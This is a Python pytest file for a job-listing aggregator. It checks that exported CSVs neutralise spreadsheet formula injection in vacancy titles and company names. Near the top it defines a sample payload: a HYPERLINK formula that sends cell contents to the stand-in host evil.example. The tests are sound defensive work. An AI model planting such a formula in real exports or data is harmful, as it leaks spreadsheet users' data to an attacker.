"""CSV sem injeção de fórmula: títulos e empresas vêm dos portais."""

from __future__ import annotations

import csv
import io
from pathlib import Path

import pytest

from job_radar.models import CollectionStatus, SourceRunResult, VacancyRecord
from job_radar.output import rewrite_payloads, write_outputs
from job_radar.pipeline import PipelineResult
from job_radar.text_cleaning import spreadsheet_safe
from job_radar.webapp import build_jobs_csv

EVIL = '=HYPERLINK("http://evil.example/?"&A1;"Clique")'


@pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
def test_spreadsheet_safe_neutralizes_formula_prefixes(prefix: str) -> None:
    assert spreadsheet_safe(f"{prefix}1+1") == f"'{prefix}1+1"


@pytest.mark.parametrize("value", ["Dev Java", "https://x.com/1", "", None, 42])
def test_spreadsheet_safe_keeps_normal_values(value) -> None:
    assert spreadsheet_safe(value) == value


def _cells(text: str, delimiter: str) -> list[str]:
    return [cell for row in csv.reader(io.StringIO(text), delimiter=delimiter) for cell in row]


def test_dashboard_csv_neutralizes_formulas() -> None:
    job = {
        "title": EVIL,
        "company": "+cmd",
        "canonical_url": "https://x.com/1",
        "match_labels": ["FIT:READY"],
    }

    cells = _cells(build_jobs_csv([job], {}).decode("utf-8-sig"), ";")

    assert "'" + EVIL in cells
    assert "'+cmd" in cells
    assert EVIL not in cells


def _record() -> VacancyRecord:
    return VacancyRecord(
        source="gupy",
        source_job_id="1",
        canonical_url="https://x.com/1",
        title=EVIL,
        company="@empresa",
        observed_at="2026-09-29T12:00:00+00:00",
        match_labels=("FIT:READY",),
    )


def test_collection_csv_neutralizes_formulas(tmp_path: Path) -> None:
    record = _record()
    write_outputs(
        PipelineResult(
            started_at="2026-09-29T12:00:00+00:00",
            finished_at="2026-09-29T12:01:00+00:00",
            records=(record,),
            ambiguous=(),
            source_results=(SourceRunResult("gupy", CollectionStatus.SUCCESS, records=(record,)),),
            raw_record_count=1,
            duplicate_count=0,
        ),
        tmp_path,
    )
    cells = _cells((tmp_path / "vagas.csv").read_text(encoding="utf-8"), ",")

    assert "'" + EVIL in cells and "'@empresa" in cells

    import json

    payload = json.loads((tmp_path / "vagas.jsonl").read_text(encoding="utf-8"))
    assert payload["title"] == EVIL  # o JSONL guarda o dado original
    rewrite_payloads(tmp_path, [payload])
    cells = _cells((tmp_path / "vagas.csv").read_text(encoding="utf-8"), ",")
    assert "'" + EVIL in cells
